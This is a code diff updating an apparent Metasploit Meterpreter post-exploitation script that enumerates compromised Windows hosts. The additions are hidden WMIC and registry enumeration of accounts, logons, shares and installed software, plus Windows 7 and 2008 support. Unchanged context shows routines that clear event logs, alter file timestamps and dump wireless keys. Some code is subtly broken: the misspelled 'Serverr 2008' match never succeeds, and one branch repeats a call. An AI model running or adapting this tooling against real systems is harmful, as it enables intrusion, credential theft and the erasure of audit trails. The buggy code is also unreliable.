@@ -1,20 +1,21 @@
 #!/usr/bin/env ruby
 #
 #Meterpreter script for basic enumeration of Windows 2000, Windows 2003, Windows Vista
-# and Windows XP targets using native windows commands.
+#Windows 7 and Windows XP targets using native windows commands.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.3.4
+#Verion: 0.3.5
 #Note: Compleatly re-writen to make it modular and better error handling.
 #      Working on adding more Virtual Machine Checks and looking at improving
 #      the code but retain the independance of each module so it is easier for
 #      the code to be re-used.
 #Contributor: natron (natron 0x40 invisibledenizen 0x2E com) (Process Migration Functions)
+#             inquis (bernardo.damele 0x40 gmail 0x2E com) (Minor Fixes)
 ################## Variable Declarations ##################
 session = client
 host,port = session.tunnel_peer.split(':')
 
 # Create Filename info to be appended to downloaded files
-filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))
+filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
 
 # Create a directory for the logs
 logs = ::File.join(Msf::Config.config_directory, 'logs', 'winenum', host + filenameinfo )
@@ -47,8 +48,12 @@ commands = [
 	'net group administrators',
 	'net view /domain',
 	'netsh firewall show config',
-	'tasklist /svc'
-
+	'tasklist /svc',
+	'tasklist /m'
+]
+# Windows 2008 Commands
+win2k8cmd = [
+	'oclist',
 ]
 # Commands wich MACE will be changed
 cmdstomp = [
@@ -65,14 +70,21 @@ cmdstomp = [
 	]
 # WMIC Commands that will be executed on the Target
 wmic = [
-	'computersystem list',
+	'computersystem list brief',
 	'useraccount list',
 	'group list',
 	'service list brief',
 	'volume list brief',
+	'logicaldisk get description,filesystem,name,size',
+	'netlogin get name,lastlogon,badpasswordcount',
+	'netclient list brief',
+	'netuse get name,username,connectiontype,localname',
+	'share get name,path',
+	'nteventlog get path,filename,writeable',
 	'process list brief',
 	'startup list full',
 	'rdtoggle list',
+	'product get name,version',
 	'qfe',
 ]
 #Specific Commands for Windows vista for Wireless Enumeration
@@ -184,7 +196,7 @@ def wmicexec(session,wmiccmds= nil)
 	tmp = session.fs.file.expand_path("%TEMP%")
 	wmicfl = tmp + "\\wmictmp.txt"
 	wmiccmds.each do |wmi|
-		print_status "\trunning command wimic #{wmi}"
+		print_status "\trunning command wmic #{wmi}"
 		r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
 		sleep(1)
 		r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} >> #{wmicfl}",nil, {'Hidden' => 'true'})
@@ -193,6 +205,18 @@ def wmicexec(session,wmiccmds= nil)
 		sleep(1)
 		r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
 		sleep(2)
+		#Making sure that wmic finnishes before executing next wmic command
+		prog2check = "wmic.exe"
+		found = 0
+		while found == 0
+			session.sys.process.get_processes().each do |x|
+				found =1
+				if prog2check == (x['name'].downcase)
+					sleep(0.5)
+					found = 0
+				end
+			end
+		end
 		r.close
 	end
 	# Read the output file of the wmic commands
@@ -365,6 +389,22 @@ def regdump(session,pathoflogs,filename)
 
 end
 #-------------------------------------------------------------------------------
+# Function for extracting program list from registry
+def findprogs(session)
+	print_status("Extracting software list from registry")
+	proglist = ""
+	session.sys.registry.create_key(HKEY_CURRENT_USER, 'Software').each_key() do |company|
+	       proglist << "#{company}"
+	       
+	        session.sys.registry.create_key(HKEY_CURRENT_USER, "Software\\#{company}").each_key() do |software|
+	         proglist <<  "\t#{software}"
+	        end
+	end
+	print_status("Finnished Extraction of software list from registry")
+	proglist
+end
+
+#-------------------------------------------------------------------------------
 # Function that will call 2 other Functions to cover all tracks
 def covertracks(session,cmdstomp)
 	clrevtlgs(session)
@@ -504,6 +544,9 @@ end
 def winver(session)
 	stringtest = ""
 	verout = []
+	tmp = session.fs.file.expand_path("%TEMP%")
+	wmitmptxt = tmp + "\\" + sprintf("%.5d",rand(100000))
+
 	r = session.sys.process.execute("cmd.exe /c ver", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
 			stringtest << d
@@ -515,9 +558,21 @@ def winver(session)
 	version = nil
 	if verout[0] == "6"
 		if verout[1] == "0"
-			version = "Windows Vista/Windows 2008"
+			r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmitmptxt} os get name", nil, {'Hidden' => true})
+			sleep(2)
+			# Read the output file of the wmic commands
+			r = session.sys.process.execute("cmd.exe /c type #{wmitmptxt}", nil, {'Hidden' => 'true','Channelized' => true})
+			while(d = r.channel.read)
+				if d =~ /Windows Serverr 2008/
+					version = "Windows 2008"
+				elsif d =~ /Windows Vista/
+					version = "Windows Vista"
+				end
+			end
+			r.channel.close
+			r.close
 		elsif verout[1] == "1"
-			version = "Windpows 7"
+			version = "Windows 7"
 		end
 	elsif verout [0] == "5"
 		if verout[1] == "0"
@@ -588,13 +643,20 @@ if helpopt != 1
 	if trgtos =~ /(Windows XP)/
 		filewrt(dest,list_exec(session,commands))
 		filewrt(dest,wmicexec(session,wmic))
+		filewrt(dest,findprogs(session))
 		dumpwlankeys(session,logs,filenameinfo)
-	elsif trgtos =~ /(Windows .NET Server)/
+	elsif trgtos =~ /(Windows 2003)/
 		filewrt(dest,list_exec(session,commands))
 		filewrt(dest,wmicexec(session,wmic))
+		filewrt(dest,findprogs(session))
 	elsif trgtos =~ /(Windows Vista)/
 		filewrt(dest,list_exec(session,commands + vstwlancmd))
 		filewrt(dest,wmicexec(session,wmic))
+		filewrt(dest,findprogs(session))
+	elsif trgtos =~ /(Windows 7)/
+		filewrt(dest,list_exec(session,commands + vstwlancmd))
+		filewrt(dest,wmicexec(session,wmic))
+		dumpwlankeys(session,logs,filenameinfo)
 		dumpwlankeys(session,logs,filenameinfo)
 	elsif trgtos =~ /(Windows 2000)/
 		filewrt(dest,list_exec(session,commands - nonwin2kcmd))
